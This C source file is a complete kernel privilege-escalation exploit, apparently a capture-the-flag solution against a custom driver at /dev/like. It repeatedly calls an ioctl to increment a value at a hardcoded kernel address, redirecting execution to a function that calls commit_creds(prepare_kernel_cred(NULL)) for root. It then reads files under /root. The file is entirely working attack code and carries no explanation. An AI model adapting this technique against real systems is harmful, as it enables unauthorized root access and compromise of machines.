#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>

#define MAJOR_NUMBER 489

#define IOCTL_CALL _IOWR(MAJOR_NUMBER,0,char *)

struct comment {
    char *comment_string;
    unsigned long long *likes;
};

typedef int (*run_cmd_type)(const char *cmd);
run_cmd_type run_cmd = (void*)0xffffffff8104dfc0;

typedef int (*commit_creds_type)(void *new);
typedef void* (*prepare_kernel_cred_type)(void* );
/*
ffffffff8104da50 T commit_creds
ffffffff8104dc10 T prepare_kernel_cred
*/

commit_creds_type commit_creds = (void*)0xffffffff8104da50;
prepare_kernel_cred_type prepare_kernel_cred = (void*)0xffffffff8104dc10;

void target() {
    commit_creds(prepare_kernel_cred(NULL));
}

int main(void) {
    int dev_fd = open("/dev/like", O_RDONLY);
    printf("Hello, World! %lu\n", IOCTL_CALL);

    struct comment c = {
        "Some Quote",
        (unsigned long long*)(0xffffffffa0002010),
    };

    unsigned long long target_addr = (unsigned long long)&target;
    target_addr--;

    printf("target %p %llx\n", &target, target_addr);

    for (unsigned long long i = 0; i < target_addr; i++) ioctl(dev_fd, IOCTL_CALL, &c);
    
    char buf[10];
    read(dev_fd, buf, 1);
    system("ls -l /root && cat /root/flag*");

    close(dev_fd);
    return 0;
}

__attribute__((constructor))
void setup() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}


